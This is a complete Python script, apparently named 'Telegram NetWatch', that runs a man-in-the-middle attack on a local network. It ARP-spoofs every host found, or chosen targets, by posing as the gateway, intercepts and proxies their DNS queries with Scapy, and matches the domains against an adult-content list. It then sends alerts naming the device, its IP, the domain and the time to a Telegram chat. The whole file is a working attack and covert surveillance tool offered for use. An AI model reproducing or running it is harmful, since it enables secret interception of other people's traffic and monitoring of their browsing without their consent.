#!/usr/bin/env python3
"""
Telegram NetWatch — MitM mode.
ARP-spoofs the LAN so all DNS queries route through this machine,
intercepts them with Scapy, forwards to upstream, and notifies on tracked domains.
No router changes required. Requires root/sudo.
"""
import os
import sys
import time
import signal
import socket
import threading
import subprocess
import platform
import re
import bisect
import requests
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

TELEGRAM_TOKEN   = os.environ.get('TELEGRAM_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
UPSTREAM_DNS     = os.environ.get('UPSTREAM_DNS', '8.8.8.8')
UPSTREAM_PORT    = int(os.environ.get('UPSTREAM_PORT', '53'))
GATEWAY_IP       = os.environ.get('GATEWAY_IP', '')
TARGET_IPS       = os.environ.get('TARGET_IPS', '')
NETWORK          = os.environ.get('NETWORK', '')
SPOOF_INTERVAL   = float(os.environ.get('SPOOF_INTERVAL', '2'))
BLOCKLIST_URL    = os.environ.get(
    'BLOCKLIST_URL',
    'https://raw.githubusercontent.com/chadmayfield/my-pihole-blocklists/master/lists/pi_blocklist_porn_all.list',
)
REFRESH_HOURS = int(os.environ.get('REFRESH_HOURS', '24'))
COOLDOWN_SEC  = int(os.environ.get('COOLDOWN_SEC', '300'))
DEBUG         = os.environ.get('DEBUG', '').lower() in ('1', 'true', 'yes')

blocklist: list[str] = []
device_cache: dict[str, str] = {}
cooldown_cache: dict[str, float] = {}
bl_lock = threading.Lock()
stop_event = threading.Event()


# ── watchlist ─────────────────────────────────────────────────────────────────

def load_blocklist() -> None:
    global blocklist
    print('[*] Downloading watchlist…', flush=True)
    try:
        resp = requests.get(BLOCKLIST_URL, timeout=60)
        resp.raise_for_status()
        domains = sorted({
            line.strip().lower()
            for line in resp.text.splitlines()
            if line.strip() and not line.startswith('#')
        })
        with bl_lock:
            blocklist = domains
        print(f'[*] Watchlist loaded: {len(blocklist):,} domains', flush=True)
    except Exception as e:
        print(f'[!] Watchlist download failed: {e}', flush=True)
        sys.exit(1)


def refresh_loop() -> None:
    while True:
        time.sleep(REFRESH_HOURS * 3600)
        load_blocklist()


def is_tracked(domain: str) -> bool:
    domain = domain.lower().rstrip('.')
    with bl_lock:
        bl = blocklist

    def hit(d: str) -> bool:
        idx = bisect.bisect_left(bl, d)
        return idx < len(bl) and bl[idx] == d

    if hit(domain):
        return True
    parts = domain.split('.')
    for i in range(1, len(parts) - 1):
        if hit('.'.join(parts[i:])):
            return True
    return False


# ── telegram ──────────────────────────────────────────────────────────────────

def send_telegram(text: str) -> None:
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        r = requests.post(
            f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
            json={'chat_id': TELEGRAM_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
            timeout=10,
        )
        if not r.ok:
            print(f'[!] Telegram error {r.status_code}: {r.text}', flush=True)
    except Exception as e:
        print(f'[!] Telegram send failed: {e}', flush=True)


def get_device_name(ip: str) -> str:
    if ip in device_cache:
        return device_cache[ip]
    name = ip
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        if hostname and not re.match(r'^\d+\.\d+\.\d+\.\d+$', hostname):
            name = hostname.split('.')[0]
    except Exception:
        pass
    device_cache[ip] = name
    return name


def notify(src_ip: str, domain: str) -> None:
    key = f'{src_ip}:{domain}'
    now = time.monotonic()
    if cooldown_cache.get(key, 0) + COOLDOWN_SEC > now:
        return
    cooldown_cache[key] = now

    device = get_device_name(src_ip)
    ts = datetime.now().strftime('%H:%M:%S  %d.%m.%Y')
    print(f'[TRACK] {device} ({src_ip}) → {domain}', flush=True)

    msg = (
        f'👁 <b>Activity tracked</b>\n\n'
        f'📱 <b>Device:</b> {device}\n'
        f'🔌 <b>IP:</b> <code>{src_ip}</code>\n'
        f'🌐 <b>Domain:</b> <code>{domain}</code>\n'
        f'🕐 <b>Time:</b> {ts}'
    )
    threading.Thread(target=send_telegram, args=(msg,), daemon=True).start()


# ── network helpers ───────────────────────────────────────────────────────────

def get_my_ips() -> set[str]:
    """All IP addresses assigned to this machine."""
    ips = {'127.0.0.1'}
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None):
            ips.add(info[4][0])
    except Exception:
        pass
    return ips


def get_gateway() -> str:
    if GATEWAY_IP:
        return GATEWAY_IP
    try:
        if platform.system() == 'Darwin':
            out = subprocess.check_output(
                ['route', '-n', 'get', 'default'], text=True, stderr=subprocess.DEVNULL
            )
            return re.search(r'gateway:\s+(\S+)', out).group(1)
        else:
            out = subprocess.check_output(['ip', 'route', 'show', 'default'], text=True)
            return out.split()[out.split().index('via') + 1]
    except Exception:
        print('[!] Cannot auto-detect gateway. Set GATEWAY_IP in .env', flush=True)
        sys.exit(1)


def get_network_cidr(gateway: str) -> str:
    return NETWORK or (gateway.rsplit('.', 1)[0] + '.0/24')


def get_mac(ip: str) -> str:
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, verbose=False)
    if not ans:
        raise RuntimeError(f'No ARP reply from {ip}')
    return ans[0][1].hwsrc


def scan_hosts(network: str, gateway: str, my_ips: set[str]) -> dict[str, str]:
    from scapy.all import ARP, Ether, srp
    print(f'[*] Scanning {network}…', flush=True)
    ans, _ = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network),
        timeout=3, verbose=False,
    )
    hosts = {
        rcv.psrc: rcv.hwsrc
        for _, rcv in ans
        if rcv.psrc != gateway and rcv.psrc not in my_ips
    }
    print(f'[*] Found {len(hosts)} host(s): {list(hosts.keys())}', flush=True)
    return hosts


# ── ip forwarding ─────────────────────────────────────────────────────────────

def set_ip_forwarding(enable: bool) -> None:
    val = '1' if enable else '0'
    if platform.system() == 'Darwin':
        subprocess.run(['sysctl', '-w', f'net.inet.ip.forwarding={val}'], capture_output=True)
    else:
        subprocess.run(['sysctl', '-w', f'net.ipv4.ip_forward={val}'], capture_output=True)
    print(f'[*] IP forwarding {"enabled" if enable else "disabled"}', flush=True)


# ── arp spoof ─────────────────────────────────────────────────────────────────

def _arp_send(pdst: str, hwdst: str, psrc: str, hwsrc: str | None = None) -> None:
    from scapy.all import ARP, Ether, sendp
    arp = ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
    if hwsrc:
        arp.hwsrc = hwsrc
    sendp(Ether(dst=hwdst) / arp, verbose=False)


def spoof_loop(targets: dict[str, str], gateway_ip: str, gateway_mac: str) -> None:
    while not stop_event.is_set():
        for ip, mac in targets.items():
            _arp_send(ip, mac, gateway_ip)              # tell device: we are the gateway
            _arp_send(gateway_ip, gateway_mac, ip)      # tell gateway: we are the device
        stop_event.wait(SPOOF_INTERVAL)


def restore_arp(targets: dict[str, str], gateway_ip: str, gateway_mac: str) -> None:
    print('[*] Restoring ARP tables…', flush=True)
    for ip, mac in targets.items():
        _arp_send(ip, mac, gateway_ip, gateway_mac)
        _arp_send(gateway_ip, gateway_mac, ip, mac)
        time.sleep(0.05)
        _arp_send(ip, mac, gateway_ip, gateway_mac)
        _arp_send(gateway_ip, gateway_mac, ip, mac)
    print('[*] ARP tables restored.', flush=True)


# ── dns intercept ─────────────────────────────────────────────────────────────

def start_dns_intercept(my_ips: set[str]) -> None:
    from scapy.all import sniff, DNS, DNSQR, IP, UDP, send as scapy_send

    def handle(pkt) -> None:
        try:
            if not (pkt.haslayer(DNS) and pkt.haslayer(DNSQR)
                    and pkt.haslayer(IP) and pkt.haslayer(UDP)):
                return
            if pkt[DNS].qr != 0:        # queries only
                return

            src_ip  = pkt[IP].src
            dst_ip  = pkt[IP].dst       # original destination (e.g. 8.8.8.8)
            sport   = pkt[UDP].sport
            domain  = pkt[DNSQR].qname.decode('utf-8', errors='replace').rstrip('.')

            if src_ip in my_ips:        # ignore our own queries
                return
            if len(domain) < 4:
                return

            if DEBUG:
                print(f'[DNS] {src_ip} → {domain}', flush=True)

            # forward raw DNS to upstream
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)
            sock.sendto(bytes(pkt[DNS]), (UPSTREAM_DNS, UPSTREAM_PORT))
            resp_data, _ = sock.recvfrom(4096)
            sock.close()

            # reply to device as if the upstream answered
            reply = (
                IP(src=dst_ip, dst=src_ip) /
                UDP(sport=53, dport=sport) /
                DNS(resp_data)
            )
            scapy_send(reply, verbose=False)

            if is_tracked(domain):
                notify(src_ip, domain)

        except Exception as e:
            if DEBUG:
                print(f'[!] DNS intercept error: {e}', flush=True)

    print('[*] DNS interceptor running (sniffing udp port 53)…', flush=True)
    sniff(filter='udp port 53', prn=handle, store=False)


# ── main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print('[*] Telegram NetWatch — MitM mode', flush=True)

    my_ips = get_my_ips()
    gateway_ip = get_gateway()
    print(f'[*] Gateway: {gateway_ip}', flush=True)

    try:
        gateway_mac = get_mac(gateway_ip)
        print(f'[*] Gateway MAC: {gateway_mac}', flush=True)
    except RuntimeError as e:
        print(f'[!] {e}', flush=True)
        sys.exit(1)

    if TARGET_IPS:
        targets: dict[str, str] = {}
        for ip in [x.strip() for x in TARGET_IPS.split(',') if x.strip()]:
            try:
                targets[ip] = get_mac(ip)
                print(f'[*] Target: {ip} ({targets[ip]})', flush=True)
            except RuntimeError:
                print(f'[!] Cannot reach {ip} — skipping', flush=True)
    else:
        network = get_network_cidr(gateway_ip)
        targets = scan_hosts(network, gateway_ip, my_ips)

    if not targets:
        print('[!] No targets found. Exiting.', flush=True)
        sys.exit(1)

    load_blocklist()
    threading.Thread(target=refresh_loop, daemon=True).start()
    set_ip_forwarding(True)

    spoof_thread = threading.Thread(
        target=spoof_loop, args=(targets, gateway_ip, gateway_mac), daemon=True
    )
    spoof_thread.start()
    print(f'[*] Spoofing {len(targets)} device(s) — Ctrl+C to stop', flush=True)

    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        send_telegram(
            f'✅ <b>Telegram NetWatch started</b> (MitM)\n'
            f'Watchlist: {len(blocklist):,} domains\n'
            f'Targets: {len(targets)} device(s)'
        )
        print('[*] Startup message sent to Telegram', flush=True)
    else:
        print('[WARN] TELEGRAM_TOKEN / TELEGRAM_CHAT_ID not set', flush=True)

    print(f'[*] Cooldown: {COOLDOWN_SEC}s per device+domain', flush=True)

    try:
        start_dns_intercept(my_ips)     # blocks until Ctrl+C
    except KeyboardInterrupt:
        pass
    finally:
        print('\n[*] Shutting down…', flush=True)
        stop_event.set()
        spoof_thread.join(timeout=5)
        restore_arp(targets, gateway_ip, gateway_mac)
        set_ip_forwarding(False)
        print('[*] Done.', flush=True)


if __name__ == '__main__':
    main()
